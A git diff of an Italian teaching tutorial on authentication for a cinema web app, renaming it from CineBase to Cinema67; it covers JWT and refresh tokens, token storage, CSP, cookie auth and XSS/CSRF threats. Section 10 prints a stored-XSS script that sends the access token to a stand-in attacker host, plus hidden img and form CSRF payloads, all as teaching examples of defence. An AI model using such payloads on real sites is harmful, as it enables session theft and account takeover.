@@ -1,14 +1,14 @@
-# Tutorial completo: autenticazione web in CineBase
+# Tutorial completo: autenticazione web in Cinema67
 
 ## Indice
 
 1. [Obiettivo del tutorial](#1-obiettivo-del-tutorial)
 2. [Prerequisiti concettuali minimi](#2-prerequisiti-concettuali-minimi)
 3. [Perché il riconoscimento utente è difficile in HTTP](#3-perché-il-riconoscimento-utente-è-difficile-in-http)
-4. [Architettura CineBase: ruoli, confini, responsabilità](#4-architettura-cinebase-ruoli-confini-responsabilità)
+4. [Architettura Cinema67: ruoli, confini, responsabilità](#4-architettura-Cinema67-ruoli-confini-responsabilità)
 5. [Modello token-based: access token + refresh token](#5-modello-token-based-access-token--refresh-token)
 6. [Flussi principali (con diagrammi Mermaid)](#6-flussi-principali-con-diagrammi-mermaid)
-7. [Interazione frontend-backend in CineBase](#7-interazione-frontend-backend-in-cinebase)
+7. [Interazione frontend-backend in Cinema67](#7-interazione-frontend-backend-in-Cinema67)
 8. [Come il backend riconosce l'utente in pratica](#8-come-il-backend-riconosce-lutente-in-pratica)
 9. [Sicurezza operativa del modello token](#9-sicurezza-operativa-del-modello-token)
 10. [Attacchi informatici rilevanti per l'autenticazione: XSS e CSRF](#10-attacchi-informatici-rilevanti-per-lautenticazione-xss-e-csrf)
@@ -16,7 +16,7 @@
 12. [Cookie-based auth in ASP.NET Minimal API (concetto)](#12-cookie-based-auth-in-aspnet-minimal-api-concetto)
 13. [Altri meccanismi di riconoscimento (panoramica)](#13-altri-meccanismi-di-riconoscimento-panoramica)
 14. [Confronto sintetico tra approcci](#14-confronto-sintetico-tra-approcci)
-15. [Quale meccanismo è più adatto per CineBase](#15-quale-meccanismo-è-più-adatto-per-cinebase)
+15. [Quale meccanismo è più adatto per Cinema67](#15-quale-meccanismo-è-più-adatto-per-Cinema67)
 16. [Checklist didattica per discussione in aula](#16-checklist-didattica-per-discussione-in-aula)
 17. [Glossario essenziale](#17-glossario-essenziale)
 18. [Conclusione](#18-conclusione)
@@ -26,9 +26,9 @@
 
 ## 1. Obiettivo del tutorial
 
-Questo tutorial introduce in modo graduale il tema dell'autenticazione nelle applicazioni web moderne, con riferimento pratico all'architettura di CineBase:
+Questo tutorial introduce in modo graduale il tema dell'autenticazione nelle applicazioni web moderne, con riferimento pratico all'architettura di Cinema67:
 
-- frontend web servito da `frontend/CineBase.Web` (porta tipica `5001`)
+- frontend web servito da `frontend/Cinema67.Web` (porta tipica `5001`)
 - backend API Minimal API in `backend/FilmAPI` (porta tipica `5000`)
 - comunicazione client-server via HTTP
 
@@ -39,7 +39,7 @@ L'obiettivo didattico è mostrare:
 3. come avvengono login, richieste protette, refresh e logout
 4. come client e backend collaborano nel dettaglio
 5. quali alternative esistono (cookie-based authentication, basic authentication)
-6. quale meccanismo è più adatto a CineBase e perché
+6. quale meccanismo è più adatto a Cinema67 e perché
 
 Il testo è scritto in terza persona, con tono formale ma accessibile.
 
@@ -54,7 +54,7 @@ Prima di entrare nel merito, è utile fissare alcuni termini:
 - **Sessione applicativa**: continuità logica tra richieste HTTP diverse
 - **RBAC** (Role-Based Access Control): autorizzazione basata su ruoli (Admin, PowerUser, User)
 
-In CineBase, autenticazione e autorizzazione sono separate: prima si verifica l'identità, poi il ruolo decide l'accesso alle API e alle pagine.
+In Cinema67, autenticazione e autorizzazione sono separate: prima si verifica l'identità, poi il ruolo decide l'accesso alle API e alle pagine.
 
 ---
 
@@ -82,12 +82,12 @@ Senza questo elemento, il backend non può distinguere un utente autenticato da 
 
 ---
 
-## 4. Architettura CineBase: ruoli, confini, responsabilità
+## 4. Architettura Cinema67: ruoli, confini, responsabilità
 
 ### 4.1 Componenti principali
 
 - **Browser**: esegue HTML/CSS/JS
-- **Frontend server** (`CineBase.Web`): serve file statici e pagine
+- **Frontend server** (`Cinema67.Web`): serve file statici e pagine
 - **Backend API** (`FilmAPI`): espone endpoint CRUD e auth
 - **Database**: conserva utenti, ruoli, refresh token e dati applicativi
 
@@ -104,7 +104,7 @@ Senza questo elemento, il backend non può distinguere un utente autenticato da 
 
 ### 5.1 Idea di base
 
-Nel modello adottato in CineBase:
+Nel modello adottato in Cinema67:
 
 - l'utente effettua il login con email/password
 - il backend rilascia:
@@ -164,10 +164,10 @@ Il payload contiene i **claim**, ovvero le informazioni sull'utente e sul token 
 ```json
 {
   "sub": "42",
-  "email": "mario.rossi@cinebase.it",
+  "email": "mario.rossi@Cinema67.it",
   "role": "PowerUser",
-  "iss": "CineBaseAPI",
-  "aud": "CineBaseWeb",
+  "iss": "Cinema67API",
+  "aud": "Cinema67Web",
   "iat": 1711900000,
   "exp": 1711900900
 }
@@ -354,7 +354,7 @@ stateDiagram-v2
     Scaduto --> [*]: Non più utilizzabile
 ```
 
-### 5.6 Gestione dei token lato client in CineBase
+### 5.6 Gestione dei token lato client in Cinema67
 
 Una volta che il backend ha emesso access token e refresh token, il frontend JavaScript deve decidere **dove conservarli** nel browser. Questa scelta ha implicazioni significative sulla sicurezza.
 
@@ -390,9 +390,9 @@ Il browser mette a disposizione tre meccanismi principali di storage lato client
 - richiede protezione CSRF (l'invio automatico è anche il suo punto debole)
 - funziona bene quando frontend e backend condividono lo stesso dominio
 
-#### 5.6.3 Scelta adottata in CineBase
+#### 5.6.3 Scelta adottata in Cinema67
 
-CineBase adotta l'architettura **frontend separato** (porta 5001) + **backend API** (porta 5000), con comunicazione cross-origin via `fetch` e header `Authorization: Bearer`.
+Cinema67 adotta l'architettura **frontend separato** (porta 5001) + **backend API** (porta 5000), con comunicazione cross-origin via `fetch` e header `Authorization: Bearer`.
 
 In questo contesto la scelta naturale è `localStorage`:
 
@@ -400,7 +400,7 @@ In questo contesto la scelta naturale è `localStorage`:
 - il modello fetch + header `Authorization` è il pattern standard per SPA e architetture API-first
 - la mitigazione principale per XSS è applicata sul codice (sanitizzazione, CSP), non sullo storage
 
-> **Nota didattica**: per il contesto didattico di CineBase si privilegia la chiarezza dell'approccio `localStorage`. In un contesto di produzione con requisiti di sicurezza elevati si adotta uno schema più sofisticato, descritto nella sezione seguente.
+> **Nota didattica**: per il contesto didattico di Cinema67 si privilegia la chiarezza dell'approccio `localStorage`. In un contesto di produzione con requisiti di sicurezza elevati si adotta uno schema più sofisticato, descritto nella sezione seguente.
 
 #### 5.6.3.1 Schema production-grade: access token in memoria + refresh token in cookie HttpOnly
 
@@ -536,14 +536,14 @@ app.MapPost("/auth/refresh", async (IAuthService auth, HttpContext ctx) =>
 
 **Vantaggi e compromessi rispetto a localStorage**
 
-| Aspetto | localStorage (CineBase didattico) | Memoria + cookie HttpOnly (production) |
+| Aspetto | localStorage (Cinema67 didattico) | Memoria + cookie HttpOnly (production) |
 |---|---|---|
 | Resistenza a XSS | Bassa (token leggibili da JS) | Alta (token non leggibili da JS) |
 | Resistenza a CSRF | Alta (no invio automatico) | Richiede `SameSite=Strict` o token CSRF |
 | Sopravvivenza al reload della pagina | Sì | Solo tramite silent refresh |
 | Complessità implementativa | Bassa | Media-Alta |
 | Necessità di HTTPS | Raccomandata | Obbligatoria (`Secure` flag) |
-| Adatto a CineBase didattico | Sì | Eccessivamente complesso per lo scopo |
+| Adatto a Cinema67 didattico | Sì | Eccessivamente complesso per lo scopo |
 | Adatto a produzione reale | Accettabile con CSP rigorosa (vedi nota) | Consigliato |
 
 > **Che cosa si intende per CSP rigorosa**: la **Content Security Policy** (CSP) è un meccanismo di sicurezza dichiarato dal server tramite l'header HTTP `Content-Security-Policy`. Istruisce il browser su quali origini sono autorizzate a caricare script, stili, immagini e altre risorse. Una CSP rigorosa riduce drasticamente la superficie di attacco XSS perché impedisce al browser di eseguire script non approvati, anche se un attaccante riesce a iniettarne uno nella pagina.
@@ -556,7 +556,7 @@ app.MapPost("/auth/refresh", async (IAuthService auth, HttpContext ctx) =>
 >   script-src 'self';
 >   style-src 'self';
 >   img-src 'self' data:;
->   connect-src 'self' https://api.cinebase.it;
+>   connect-src 'self' https://api.Cinema67.it;
 >   object-src 'none';
 >   base-uri 'self';
 >   frame-ancestors 'none'
@@ -573,28 +573,28 @@ app.MapPost("/auth/refresh", async (IAuthService auth, HttpContext ctx) =>
 
 #### 5.6.4 Come i token vengono gestiti in `auth.js`
 
-Il modulo `auth.js` del frontend CineBase gestisce il ciclo di vita dei token tramite le seguenti funzioni:
+Il modulo `auth.js` del frontend Cinema67 gestisce il ciclo di vita dei token tramite le seguenti funzioni:
 
 ```javascript
 // Salvataggio dopo login o refresh
 function saveTokens(accessToken, refreshToken) {
-    localStorage.setItem('cinebase_access_token', accessToken);
-    localStorage.setItem('cinebase_refresh_token', refreshToken);
+    localStorage.setItem('Cinema67_access_token', accessToken);
+    localStorage.setItem('Cinema67_refresh_token', refreshToken);
 }
 
 // Lettura per costruire l'header Authorization
 function getAccessToken() {
-    return localStorage.getItem('cinebase_access_token');
+    return localStorage.getItem('Cinema67_access_token');
 }
 
 function getRefreshToken() {
-    return localStorage.getItem('cinebase_refresh_token');
+    return localStorage.getItem('Cinema67_refresh_token');
 }
 
 // Pulizia al logout o quando i token non sono più validi
 function clearTokens() {
-    localStorage.removeItem('cinebase_access_token');
-    localStorage.removeItem('cinebase_refresh_token');
+    localStorage.removeItem('Cinema67_access_token');
+    localStorage.removeItem('Cinema67_refresh_token');
 }
 
 // Verifica scadenza senza chiamata al server
@@ -648,7 +648,7 @@ flowchart TD
 
 ```mermaid
 graph TD
-    subgraph JWT_LS["JWT in localStorage (CineBase)"]
+    subgraph JWT_LS["JWT in localStorage (Cinema67)"]
         LS_AT["Access Token\nlocalStorage\nleggibile da JS"]
         LS_RT["Refresh Token\nlocalStorage\nleggibile da JS"]
     end
@@ -783,7 +783,7 @@ sequenceDiagram
 
 ---
 
-## 7. Interazione frontend-backend in CineBase
+## 7. Interazione frontend-backend in Cinema67
 
 ### 7.1 Responsabilità del frontend
 
@@ -875,17 +875,17 @@ Il codice malevolo viene eseguito nello stesso contesto di sicurezza della pagin
 | **Stored XSS** | Il payload viene salvato nel database e mostrato ad altri utenti | Commento con `<script>` salvato e visualizzato nel feed |
 | **DOM-based XSS** | Il payload manipola direttamente il DOM tramite JavaScript lato client, senza passare dal server | `location.hash` usato come innerHTML senza sanificazione |
 
-#### 10.1.3 Esempio concreto nel contesto CineBase
+#### 10.1.3 Esempio concreto nel contesto Cinema67
 
 Si immagini che un campo del form "Titolo film" non venga sanificato correttamente prima di essere salvato nel database e visualizzato nella pagina film. Un attaccante con ruolo PowerUser potrebbe inserire come titolo:
 
 ```html
 <script>
-  fetch('https://attaccante.it/steal?token=' + localStorage.getItem('cinebase_access_token'));
+  fetch('https://attaccante.it/steal?token=' + localStorage.getItem('Cinema67_access_token'));
 </script>
 ```
 
-Quando un admin visualizza la lista film, il browser esegue lo script nel contesto della pagina CineBase. Il token viene inviato silenziosamente al server dell'attaccante.
+Quando un admin visualizza la lista film, il browser esegue lo script nel contesto della pagina Cinema67. Il token viene inviato silenziosamente al server dell'attaccante.
 
 #### 10.1.4 Diagramma: attacco XSS stored con furto token
 
@@ -893,7 +893,7 @@ Quando un admin visualizza la lista film, il browser esegue lo script nel contes
 sequenceDiagram
     actor ATT as Attaccante
     actor USR as Utente legittimo
-    participant APP as Applicazione CineBase
+    participant APP as Applicazione Cinema67
     participant DB as Database
     participant SRV as Server attaccante
 
@@ -946,20 +946,20 @@ Il punto chiave è che l'attaccante **non vede la risposta** della richiesta (cr
 
 #### 10.2.2 Esempio concreto: CSRF contro autenticazione cookie
 
-Si immagini che CineBase usi la cookie authentication e che un utente autenticato visiti una pagina malevola `https://sito-malevolo.it`. Quella pagina contiene:
+Si immagini che Cinema67 usi la cookie authentication e che un utente autenticato visiti una pagina malevola `https://sito-malevolo.it`. Quella pagina contiene:
 
 ```html
 <!-- Pagina malevola su sito-malevolo.it -->
-<img src="https://cinebase.it/prenotazioni/create?proiezioneId=99&posti=100"
+<img src="https://Cinema67.it/prenotazioni/create?proiezioneId=99&posti=100"
      style="display:none">
 ```
 
-Il browser, vedendo il tag `<img>`, esegue una richiesta GET verso `cinebase.it`. Poiché l'utente è autenticato su CineBase, il browser allega automaticamente il cookie di sessione. Il server CineBase riceve la richiesta con cookie valido e la esegue come se venisse dall'utente.
+Il browser, vedendo il tag `<img>`, esegue una richiesta GET verso `Cinema67.it`. Poiché l'utente è autenticato su Cinema67, il browser allega automaticamente il cookie di sessione. Il server Cinema67 riceve la richiesta con cookie valido e la esegue come se venisse dall'utente.
 
 Per richieste POST il meccanismo è analogo, tramite form nascosto:
 
 ```html
-<form id="csrf-form" action="https://cinebase.it/admin/utenti/5/ruolo"
+<form id="csrf-form" action="https://Cinema67.it/admin/utenti/5/ruolo"
       method="POST" style="display:none">
   <input name="ruolo" value="Admin">
 </form>
@@ -970,17 +970,17 @@ Per richieste POST il meccanismo è analogo, tramite form nascosto:
 
 ```mermaid
 sequenceDiagram
-    actor USR as Utente (autenticato su CineBase)
+    actor USR as Utente (autenticato su Cinema67)
     participant MAL as Sito malevolo
-    participant APP as CineBase (sito legittimo)
+    participant APP as Cinema67 (sito legittimo)
     participant DB as Database
 
-    USR->>APP: Login su CineBase
+    USR->>APP: Login su Cinema67
     APP-->>USR: Set-Cookie session=abc123
 
     note over USR: Utente naviga su un altro sito
     USR->>MAL: Visita sito-malevolo.it
-    MAL-->>USR: HTML con form/img nascosto verso CineBase
+    MAL-->>USR: HTML con form/img nascosto verso Cinema67
 
     note over USR: Il browser esegue la richiesta cross-site automaticamente
     USR->>APP: POST /admin/utenti/5/ruolo + Cookie session=abc123 (inviato automaticamente)
@@ -992,7 +992,7 @@ sequenceDiagram
 
 #### 10.2.4 Perché CSRF non colpisce JWT in Authorization header
 
-Quando i token vengono inviati nell'header `Authorization: Bearer <token>` (come in CineBase), il CSRF **non è applicabile**. Il motivo è preciso: il browser invia automaticamente i **cookie**, ma **non aggiunge da solo header personalizzati** come `Authorization`. Quell'header deve essere impostato esplicitamente dal codice JavaScript dell'applicazione legittima.
+Quando i token vengono inviati nell'header `Authorization: Bearer <token>` (come in Cinema67), il CSRF **non è applicabile**. Il motivo è preciso: il browser invia automaticamente i **cookie**, ma **non aggiunge da solo header personalizzati** come `Authorization`. Quell'header deve essere impostato esplicitamente dal codice JavaScript dell'applicazione legittima.
 
 Un sito malevolo che forza il browser a fare una richiesta cross-origin non può aggiungere l'header `Authorization`, quindi la richiesta arriva al backend senza token e viene rifiutata con `401 Unauthorized`.
 
@@ -1000,10 +1000,10 @@ Un sito malevolo che forza il browser a fare una richiesta cross-origin non può
 sequenceDiagram
     actor USR as Utente (token in localStorage)
     participant MAL as Sito malevolo
-    participant APP as CineBase API (JWT)
+    participant APP as Cinema67 API (JWT)
 
     USR->>MAL: Visita sito-malevolo.it
-    MAL-->>USR: HTML con richiesta cross-origin verso CineBase
+    MAL-->>USR: HTML con richiesta cross-origin verso Cinema67
 
     USR->>APP: POST /prenotazioni (senza header Authorization)
     note over APP: Nessun header Authorization presente
@@ -1027,7 +1027,7 @@ ctx.Response.Cookies.Append("refresh_token", value, new CookieOptions
 });
 ```
 
-Con `SameSite=Strict` il cookie viene inviato **solo se la navigazione parte dallo stesso sito**: una richiesta da `sito-malevolo.it` verso `cinebase.it/auth/refresh` non porterà il cookie.
+Con `SameSite=Strict` il cookie viene inviato **solo se la navigazione parte dallo stesso sito**: una richiesta da `sito-malevolo.it` verso `Cinema67.it/auth/refresh` non porterà il cookie.
 
 #### 10.2.6 Contromisure principali per CSRF
 
@@ -1057,7 +1057,7 @@ Con `SameSite=Strict` il cookie viene inviato **solo se la navigazione parte dal
 
 ---
 
-### 10.4 Implicazione pratica per CineBase
+### 10.4 Implicazione pratica per Cinema67
 
 | Scenario | Esposto a XSS | Esposto a CSRF | Note |
 |---|---|---|---|
@@ -1117,7 +1117,7 @@ builder.Services
     .AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
     .AddCookie(options =>
     {
-        options.Cookie.Name = "cinebase.auth";
+        options.Cookie.Name = "Cinema67.auth";
         options.Cookie.HttpOnly = true;
         options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
         options.Cookie.SameSite = SameSiteMode.Lax;
@@ -1186,7 +1186,7 @@ sequenceDiagram
     B->>API: POST /login
     API->>API: Verifica credenziali
     API->>API: Crea ClaimsPrincipal + ticket di autenticazione
-    API-->>B: Set-Cookie cinebase.auth (HttpOnly, Secure)
+    API-->>B: Set-Cookie Cinema67.auth (HttpOnly, Secure)
 
     B->>API: GET /me con cookie automatico
     API->>API: Decifra e valida ticket dal cookie
@@ -1194,7 +1194,7 @@ sequenceDiagram
     API-->>B: 200 Dati utente
 
     B->>API: POST /logout
-    API-->>B: Set-Cookie cinebase.auth scaduto
+    API-->>B: Set-Cookie Cinema67.auth scaduto
 ```
 
 ---
@@ -1219,7 +1219,7 @@ sequenceDiagram
 - ambienti interni limitati
 - integrazioni legacy
 
-**Non consigliata** per CineBase in produzione didattica estesa.
+**Non consigliata** per Cinema67 in produzione didattica estesa.
 
 ### 13.2 Session server-side classica
 
@@ -1260,7 +1260,7 @@ La sessione server-side è spesso appropriata quando:
 - l'applicazione è prevalentemente browser-based
 - si privilegia il controllo centralizzato delle sessioni rispetto alla portabilità dei token
 
-Nel caso CineBase (frontend e backend separati, orientamento API-first), è un'opzione possibile ma in genere meno ergonomica del modello JWT + refresh token.
+Nel caso Cinema67 (frontend e backend separati, orientamento API-first), è un'opzione possibile ma in genere meno ergonomica del modello JWT + refresh token.
 
 ### 13.2.1 Differenza reale tra cookie-based auth e session server-side
 
@@ -1329,30 +1329,30 @@ Potrebbe essere un'evoluzione futura, ma introduce complessità superiore al per
 | Dipendenza da session store condiviso | Bassa | Bassa | Alta in scaling orizzontale | Bassa |
 | Revoca centralizzata immediata | Media (tipica su refresh token) | Media | Alta | Bassa |
 | Adatto a RBAC granulari | Alta | Alta | Alta | Bassa |
-| Adatto a CineBase | **Molto adatto** | Possibile alternativa | Alternativa meno naturale | Non adatto |
+| Adatto a Cinema67 | **Molto adatto** | Possibile alternativa | Alternativa meno naturale | Non adatto |
 
 ---
 
-## 15. Quale meccanismo è più adatto per CineBase
+## 15. Quale meccanismo è più adatto per Cinema67
 
 ### 15.1 Valutazione nel contesto specifico
 
-Per CineBase, l'approccio più coerente è il modello **token-based con access token + refresh token** per i seguenti motivi:
+Per Cinema67, l'approccio più coerente è il modello **token-based con access token + refresh token** per i seguenti motivi:
 
 1. architettura già separata tra frontend e backend API
 2. necessità di RBAC esplicito su endpoint diversi
 3. possibile evoluzione futura verso client aggiuntivi (mobile, integrazioni)
 4. facilità di test automatizzati su ruoli e policy
 
-### 15.2 Posizionamento della sessione server-side in CineBase
+### 15.2 Posizionamento della sessione server-side in Cinema67
 
-La sessione server-side classica resta una tecnologia valida e matura, ma nel contesto di CineBase presenta alcuni compromessi:
+La sessione server-side classica resta una tecnologia valida e matura, ma nel contesto di Cinema67 presenta alcuni compromessi:
 
 - richiede una gestione più infrastrutturale in caso di scaling orizzontale (session store condiviso)
 - è meno allineata al paradigma API-first e al consumo da client eterogenei
 - aumenta la dipendenza dal modello browser + cookie rispetto a bearer token espliciti
 
-Pertanto, per CineBase può essere considerata una **seconda scelta architetturale**: funziona, ma risulta generalmente meno lineare dell'approccio JWT + refresh token in questa specifica struttura.
+Pertanto, per Cinema67 può essere considerata una **seconda scelta architetturale**: funziona, ma risulta generalmente meno lineare dell'approccio JWT + refresh token in questa specifica struttura.
 
 ### 15.3 Chiarimento operativo: cookie-based vs session-based in ASP.NET Core
 
@@ -1394,7 +1394,7 @@ Di seguito una traccia utile per guidare il confronto con gli studenti:
 5. mostrare come il ruolo influenza API e UI
 6. confrontare token-based e cookie-based con esempi reali
 7. analizzare minacce principali (XSS, CSRF, token theft)
-8. motivare la scelta architetturale per CineBase
+8. motivare la scelta architetturale per Cinema67
 
 ---
 
@@ -1412,7 +1412,7 @@ Di seguito una traccia utile per guidare il confronto con gli studenti:
 
 ## 18. Conclusione
 
-Nel contesto CineBase, il meccanismo token-based con access token e refresh token offre un equilibrio efficace tra sicurezza, controllo dei ruoli e flessibilità architetturale. La comprensione del carattere stateless di HTTP è il punto di partenza essenziale: solo dopo questa consapevolezza diventano chiari i motivi tecnici delle scelte progettuali.
+Nel contesto Cinema67, il meccanismo token-based con access token e refresh token offre un equilibrio efficace tra sicurezza, controllo dei ruoli e flessibilità architetturale. La comprensione del carattere stateless di HTTP è il punto di partenza essenziale: solo dopo questa consapevolezza diventano chiari i motivi tecnici delle scelte progettuali.
 
 Per una formazione completa, la trattazione deve includere anche cookie-based authentication e basic authentication, in modo che gli studenti imparino a scegliere il meccanismo corretto in base a contesto, vincoli e obiettivi applicativi.
 
@@ -1420,7 +1420,7 @@ Per una formazione completa, la trattazione deve includere anche cookie-based au
 
 ## 19. Appendice - Aggiornamento implementativo Aprile 2026
 
-Questa appendice documenta le modifiche reali introdotte nel codice CineBase per migliorare il ciclo di vita dei refresh token.
+Questa appendice documenta le modifiche reali introdotte nel codice Cinema67 per migliorare il ciclo di vita dei refresh token.
 
 ### 19.1 Nuovi vincoli funzionali introdotti
 
